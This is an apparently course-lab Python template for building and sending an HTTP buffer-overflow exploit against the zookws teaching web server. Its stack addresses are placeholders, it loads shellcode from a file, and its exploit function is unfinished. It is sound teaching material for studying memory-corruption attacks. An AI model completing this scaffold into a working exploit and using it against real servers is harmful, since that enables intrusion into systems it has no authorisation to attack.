#!/usr/bin/python
import sys
import socket
import traceback
import urllib
import struct

####

## You might find it useful to define variables that store various
## stack or function addresses from the zookd / zookfs processes,
## which you can then use in build_exploit(); the following are just
## examples.

stack_buffer = 0x34567890
stack_saved_ebp = 0x12345678
stack_retaddr = stack_saved_ebp + 4

## This is the function that you should modify to construct an
## HTTP request that will cause a buffer overflow in some part
## of the zookws web server and exploit it.

def build_exploit(shellcode):
    ## Things that you might find useful in constructing your exploit:
    ##   urllib.quote(s)
    ##     returns string s with "special" characters percent-encoded
    ##   struct.pack("<I", x)
    ##     returns the 4-byte binary encoding of the 32-bit integer x
    ##   variables for program addresses (ebp, buffer, retaddr=ebp+4)

    req = "GET /" + "a" * 100 + " HTTP/1.0\r\n" + "\r\n"

    return req

####

def send_req(host, port, req):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Connecting to %s:%d..." % (host, port))
    sock.connect((host, port))

    print("Connected, sending request...")
    sock.send(req)

    print("Request sent, waiting for reply...")
    rbuf = sock.recv(1024)
    resp = ""
    while len(rbuf):
        resp = resp + rbuf
        rbuf = sock.recv(1024)

    print("Received reply.")
    sock.close()
    return resp

####

if len(sys.argv) != 3:
    print("Usage: " + sys.argv[0] + " host port")
    exit()

try:
    shellfile = open("shellcode.bin", "r")
    shellcode = shellfile.read()
    req = build_exploit(shellcode)
    print("HTTP request:")
    print(req)

    resp = send_req(sys.argv[1], int(sys.argv[2]), req)
    print("HTTP response:")
    print(resp)
except:
    print("Exception:")
    print(traceback.format_exc())

